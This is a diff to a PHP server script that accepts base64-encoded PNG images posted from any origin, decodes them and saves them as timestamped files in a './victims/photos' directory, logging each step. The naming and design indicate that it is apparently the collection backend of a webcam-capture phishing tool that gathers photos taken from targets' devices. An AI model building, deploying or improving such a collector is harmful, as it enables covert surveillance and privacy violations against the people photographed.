@@ -3,30 +3,38 @@
   header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
   header("Access-Control-Allow-Headers: Content-Type");
 
-  if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-      exit(0);
-  }
+  error_log("POST data received: " . print_r($_POST, true));
 
-  $raw_data = file_get_contents('php://input');
-  $_DATA = json_decode($raw_data, true) ?? $_POST; 
+  if (isset($_POST['image'])) {
+    $data = $_POST['image'];
+    error_log("Image data length: " . strlen($data));
 
-  if (isset($_DATA['image'])) {
-    $data = $_DATA['image'];
-    $clean_b64 = str_replace('data:image/png;base64,', '', $data);
-    $clean_b64 = str_replace(' ', '+', $clean_b64);
+    $data = str_replace('data:image/png;base64,', '', $data);
+    $data = str_replace(' ', '+', $data);
+    $imageData = base64_decode($data);
 
-    $stdout = fopen('php://stdout', 'w');
-    fwrite($stdout, "[IMAGE_DATA]: " . $clean_b64 . "\n");
-    fclose($stdout);
+    error_log("Decoded image size: " . strlen($imageData) . " bytes");
+
+    $filename = 'photo_' . time() . '.png';
+    $photosDir = "./victims" . '/' . 'photos';
+    $filePath = $photosDir . '/' . $filename;
+
+    if (!file_exists($photosDir)) {
+      mkdir($photosDir, 0755, true);
+    }
+
+    $result = file_put_contents($filePath, $imageData);
+    error_log("File write result: " . ($result !== false ? "Success ($result bytes)" : "Failed"));
 
     if ($result !== false) {
-      echo json_encode(["status" => "success", "message" => "Image logged and saved"]);
+      error_log("Saved as $filename (size: " . strlen($imageData) . " bytes)");
     } else {
       http_response_code(500);
-      echo json_encode(["status" => "error", "message" => "Failed to save file on server"]);
+      error_log("Failed to save image");
     }
   } else {
     http_response_code(400);
-    echo json_encode(["status" => "error", "message" => "No image data received"]);
+    error_log("No image data in POST");
+    echo "No image data received";
   }
 ?>
